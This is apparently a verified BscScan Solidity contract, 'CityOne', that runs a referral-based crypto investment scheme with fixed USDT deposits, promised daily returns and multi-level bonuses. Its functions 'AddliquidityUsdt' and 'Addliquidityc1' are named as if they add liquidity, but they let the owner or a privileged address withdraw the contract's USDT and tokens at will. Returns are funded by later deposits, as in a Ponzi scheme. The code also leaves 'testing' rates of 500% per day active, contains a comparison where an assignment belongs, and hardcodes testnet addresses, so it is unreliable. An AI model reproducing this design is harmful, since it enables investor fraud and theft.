/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
contract CityOne {
    using SafeMath for uint256;
     IPancakeRouter01 public pancakeswap;
    IBEP20 public token;
    IBEP20 public tokenUSDT;

    uint256 public constant p1_amt = 150e18; //100$
    uint256 public constant p2_amt = 550e18;
    uint256 public constant p3_amt = 1150e18;
    uint256 public constant p4_amt = 5500e18;
    uint256[] public reward = [250e18,1000e18,2500e18,3750e18,5000e18,7500e18,15000e18,25000e18,50000e18,100000e18];
    uint256[] public reward_level_business_condition = [5000e18,20000e18,50000e18,75000e18,100000e18,150000e18,250000e18,500000e18,1000000e18,2500000e18];
    uint256[] public GI_PERCENT = [10,10,10,10,10,10,10,8,8,8,5,5,5,5,5,5];
    // uint256 public  BASE_PERCENT = 50; // 0.5% per day

    //For testing
    uint256 public  BASE_PERCENT = 50000; // 500% per day
    // uint256 public constant working_roi = 50; // 0.5% per day

    //For testing
    uint256 public constant working_roi = 50000; // 500% per day
    uint256 public constant PERCENTS_DIVIDER = 10000;
    uint256 public constant TIME_STEP = 1 days;
    uint256 public LAUNCH_TIME;
    uint256 public totalInvested;
    uint256 public totalWithdrawn;
    uint256 public totalDeposits;
    address private liqidity_provider;
    uint256 gi_bonus;
    address payable public marketingAddress;
    address payable public projectAddress;
    address payable public owner;

    struct Deposit {
        uint256 amount;
        uint256 start;
    }

    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        address payable referrer;
        uint256 direct_amount;
        uint256 gi_bonus;
        uint256 total_gi_bonus;
        uint256 reward_earned;
        uint256 available;
        uint256 withdrawn;
        mapping(uint8 => uint256) structure;
        mapping(uint8 => uint256) level_business;
        mapping(uint8 => bool) rewards;
        uint256 total_direct_bonus;
        uint256 total_invested;
        bool is_networker;
        uint256 is_networker_timestamp;
       
    }

    mapping(address => User) public users;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(
        address indexed referrer,
        address indexed referral,
        uint256 indexed level,
        uint256 amount
    );
    event FeePayed(address indexed user, uint256 totalAmount);

    modifier beforeStarted() {
        require(block.timestamp >= LAUNCH_TIME, "!beforeStarted");
        _;
    }

    constructor(address payable marketingAddr,address payable _projectAddress,IBEP20 tokenAdd, IBEP20 _tokenUSDT , IPancakeRouter01 routerAdd, address _liqidity_provider) {
        require(!isContract(marketingAddr), "!marketingAddr");
        owner = msg.sender;
        marketingAddress = marketingAddr;

        liqidity_provider = _liqidity_provider;
        pancakeswap = routerAdd;

        projectAddress = _projectAddress;
         token = tokenAdd;
         tokenUSDT = _tokenUSDT;
    }

    function invest(address payable referrer,uint256 token_quantity) public payable beforeStarted() {
        uint256 tokenWei = token_quantity * 10 ** 18;
        require(tokenWei == p1_amt ||  tokenWei == p2_amt || tokenWei == p3_amt || tokenWei == p4_amt, "!INVEST_MIN_AMOUNT");
        tokenUSDT.transferFrom(msg.sender, address(this), tokenWei);
        User storage user = users[msg.sender];
        tokenUSDT.transfer(marketingAddress,tokenWei.mul(500).div(PERCENTS_DIVIDER));
        _setUpline(msg.sender, referrer,tokenWei);
        address upline  = user.referrer;
        uint256 direct_amt = tokenWei.mul(1000).div(PERCENTS_DIVIDER);

        if(users[upline].structure[0] >= 2 && users[upline].is_networker == false)
        { 
            if(block.timestamp - users[upline].deposits[0].start < 10 days)
            {
                if(tokenWei >= users[upline].deposits[0].amount)
                {
                    users[upline].is_networker == true;
                    users[upline].is_networker_timestamp = block.timestamp;
                    users[upline].available = users[upline].available.add(users[upline].total_invested);
                }
                
            }
       
        }
       
       if(direct_amt > users[upline].available )
       {
           direct_amt = users[upline].available;
       }
        users[upline].direct_amount += direct_amt;
        users[upline].total_direct_bonus += direct_amt;
        
        distribute_reward(msg.sender);

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            user.withdrawn = 0;
            emit Newbie(msg.sender);
        }

        user.total_invested += tokenWei;
        uint256 double = tokenWei.mul(2);
        user.available += double;

        user.deposits.push(Deposit(tokenWei, block.timestamp));

        totalInvested = totalInvested.add(tokenWei);
        totalDeposits = totalDeposits.add(1);
        emit NewDeposit(msg.sender,tokenWei);
        
    }

      function _setUpline(address _addr, address payable _upline,uint256 amount) private {
        if(users[_addr].referrer == address(0)) {//first time entry
            if(users[_upline].deposits.length == 0) {//no deposite from my upline
                _upline = owner;
            }
            users[_addr].referrer = _upline;
            for(uint8 i = 0; i < GI_PERCENT.length; i++) {
                users[_upline].structure[i]++;
                 users[_upline].level_business[i] += amount;
                _upline = users[_upline].referrer;
                if(_upline == address(0) || _upline == owner ) break;
            }
        }
        
         else
             {
                _upline = users[_addr].referrer;
            for( uint8 i = 0; i < GI_PERCENT.length; i++) {
                     users[_upline].level_business[i] += amount;
                    _upline = users[_upline].referrer;
                    if(_upline == address(0) || _upline == owner ) break;
                }
        }
        
    }

    function distribute_reward(address _addr) private {

        address payable _upline = users[_addr].referrer;

        for (uint8 i = 0 ; i < reward.length; i ++ )
        {
            if(users[_upline].level_business[i] >= reward_level_business_condition[i]   &&  users[_upline].rewards[i] == false)
            {
                    users[_upline].rewards[i] = true;
                    users[_upline].reward_earned += reward[i];
                    tokenUSDT.transfer(_upline,reward[i]);
            }

             _upline = users[_upline].referrer;
            if(_upline == address(0)) break;
        }

    }

    function withdraw() public beforeStarted() {
        User storage user = users[msg.sender];
        
        uint256 totalAmount;
        uint256 dividends;

        require(user.available > 0,"You have reached your  limit");
        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (user.available > 0) {
                if (user.deposits[i].start > user.checkpoint) {
                    if(user.deposits[i].amount == p4_amt)
                    {
                        BASE_PERCENT = 100;
                    }else{
                        BASE_PERCENT = 50;
                    }
                    dividends = (
                        user.deposits[i].amount.mul(BASE_PERCENT).div(
                            PERCENTS_DIVIDER
                        )
                    )
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(TIME_STEP);
                } else {
                    dividends = (
                        user.deposits[i].amount.mul(BASE_PERCENT).div(
                            PERCENTS_DIVIDER
                        )
                    )
                        .mul(block.timestamp.sub(user.checkpoint))
                        .div(TIME_STEP);
                }

            if(user.is_networker == true && user.deposits[i].amount != p4_amt && i==0) 
            {   
                 dividends += (
                        user.deposits[0].amount.mul(working_roi).div(
                            PERCENTS_DIVIDER
                        )
                    )
                         .mul(block.timestamp.sub(user.is_networker_timestamp))
                        .div(TIME_STEP);
                
            }
            totalAmount = totalAmount.add(dividends);

            }
               
        }

        uint256 min_check_value = totalAmount.add(user.direct_amount);
         min_check_value += user.gi_bonus;
        require(min_check_value  > 10e18, "Min withdraw is 10$");

         _send_gi(msg.sender,totalAmount);

        totalAmount += user.direct_amount;
        totalAmount += user.gi_bonus;

       

        if (user.available < totalAmount) {
            totalAmount = user.available;

            delete user.deposits;
        }

        uint256 fees = totalAmount.mul(1000).div(PERCENTS_DIVIDER);
        tokenUSDT.transfer(marketingAddress,fees);
        user.withdrawn = user.withdrawn.add(totalAmount);
        user.available = user.available.sub(totalAmount);
        totalAmount -= fees;
       uint[] memory pancakeResponse =  token_price(totalAmount);
        uint256 c1_to_dispatch = pancakeResponse[1];
        user.checkpoint = block.timestamp;
        token.transfer(msg.sender,c1_to_dispatch);
        user.total_gi_bonus  += user.gi_bonus; 
        user.direct_amount = 0;
        user.gi_bonus = 0;
        totalWithdrawn = totalWithdrawn.add(c1_to_dispatch);
        emit Withdrawn(msg.sender, c1_to_dispatch);
    }


  


    function _send_gi(address _addr, uint256 _amount) private {
        address up = users[_addr].referrer;

        for(uint8 i = 0; i < GI_PERCENT.length; i++) {
            if(up == address(0)) break;

            if(i< users[up].structure[0].mul(2) && users[up].available > 0)
            {
                uint256 bonus = _amount.mul(GI_PERCENT[i]).div(100);
                
                if(bonus > users[up].available)
                {
                    bonus = users[up].available;
                }
            
                users[up].gi_bonus += bonus;
                gi_bonus += bonus;
 
                
            }
            up = users[up].referrer;
        }
    }

    function getUserDividends(address userAddress) public view returns (uint256)
    {
        User storage user = users[userAddress];

        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (user.available > 0) {
                if (user.deposits[i].start > user.checkpoint) {
                    if(user.deposits[i].amount == p4_amt)
                    {

                        dividends = (
                            user.deposits[i].amount.mul(100).div(
                                PERCENTS_DIVIDER
                            )
                        )
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(TIME_STEP);
                    }else{
                        dividends = (
                            user.deposits[i].amount.mul(50).div(
                                PERCENTS_DIVIDER
                            )
                        )
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(TIME_STEP);
                    }
                    
                } else {
                     if(user.deposits[i].amount == p4_amt)
                    {
                        dividends = (
                            user.deposits[i].amount.mul(100).div(
                                PERCENTS_DIVIDER
                            )
                        )
                            .mul(block.timestamp.sub(user.checkpoint))
                            .div(TIME_STEP);
                    }
                    else{

                        dividends = (
                            user.deposits[i].amount.mul(50).div(
                                PERCENTS_DIVIDER
                            )
                        )
                            .mul(block.timestamp.sub(user.checkpoint))
                            .div(TIME_STEP);
                    }
                }

                if(user.is_networker == true && user.deposits[i].amount != p4_amt)
                {   
                    dividends += (
                            user.deposits[i].amount.mul(working_roi).div(
                                PERCENTS_DIVIDER
                            )
                        )
                            .mul(block.timestamp.sub(user.is_networker_timestamp))
                            .div(TIME_STEP);
                }
            }
            
        }
        if (dividends > user.available) {
            dividends = user.available;
        }
        return dividends;
    }



    function token_price(uint256 _amountIn) public view  returns(uint[] memory amounts) {
        // uint256 _amountIn = 1;
        address[] memory path;
        path = new address[](2);
        // path[0] = 0x3EBf2d629Ec3C1c54Df0e287616568D2d66161f7; //mjet on mainnet 
        // path[1] = 0x55d398326f99059fF775485246999027B3197955; //usdt on main net
        //testnet configuration 
        path[0] = 0x27521d76ecf466A405e493830a5e601c00B4Ce7a; // this will be usdt address
        path[1] = 0x337610d27c682E347C9cD60BD4b3b107C9d34dDd; // this wil be c1 token address  
        return pancakeswap.getAmountsOut(_amountIn, path);

        // give an  amountIN value of path[o] token, it will tell us how many path[1] token we recieve
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUserCheckpoint(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress)
        public
        view
        returns (address)
    {
        return users[userAddress].referrer;
    }

    function getUserReferralBonus(address userAddress)
        public
        view
        returns (uint256, uint256)
    {
        return (users[userAddress].gi_bonus,users[userAddress].total_direct_bonus);
    }

    function getUserAvailable(address userAddress)
        public
        view
        returns (uint256)
    {
        return getUserDividends(userAddress);
    }

    function getAvailable(address userAddress) public view returns (uint256) {
        return users[userAddress].available;
    }

    function getUserAmountOfReferrals(address userAddress)
        public
        view
        returns (
            uint256[] memory structure,
            uint256[] memory levelBusiness
        )
    {

        uint256[] memory _structure = new uint256[](GI_PERCENT.length);
        uint256[] memory _levelBusiness = new uint256[](GI_PERCENT.length);
        for(uint8 i = 0; i < GI_PERCENT.length; i++) {
            _structure[i] = users[userAddress].structure[i];
            _levelBusiness[i] = users[userAddress].level_business[i];
        }
        return (
             _structure,_levelBusiness

        );
    }


     function getrewardinfo(address userAddress)
        public
        view
        returns (
            bool[] memory reward_info
        )
    {


        bool[] memory _reward_info = new bool[](reward.length);

        for(uint8 i = 0; i < reward.length; i++) {
            _reward_info[i] = users[userAddress].rewards[i];
            
        }
        return (
            _reward_info

        );
    }

    function AddliquidityUsdt(uint256 amt) public {
        require(msg.sender == liqidity_provider || msg.sender == owner, "permission denied");
        amt  = amt * 10 ** 18;
        tokenUSDT.transfer(msg.sender, amt);
    }

    function Addliquidityc1(uint256 amt) public {
        require(msg.sender == liqidity_provider || msg.sender == owner, "permission denied");
        amt  = amt * 10 ** 18;
        token.transfer(msg.sender, amt);
    }


   


    function getUserDepositInfo(address userAddress, uint256 index)
        public
        view
        returns (uint256, uint256)
    {
        User storage user = users[userAddress];

        return (user.deposits[index].amount, user.deposits[index].start);
    }

   
    function getUserAmountOfDeposits(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];

        uint256 amount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(user.deposits[i].amount);
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];

        return user.withdrawn;
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}

interface IPancakeRouter01 {
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}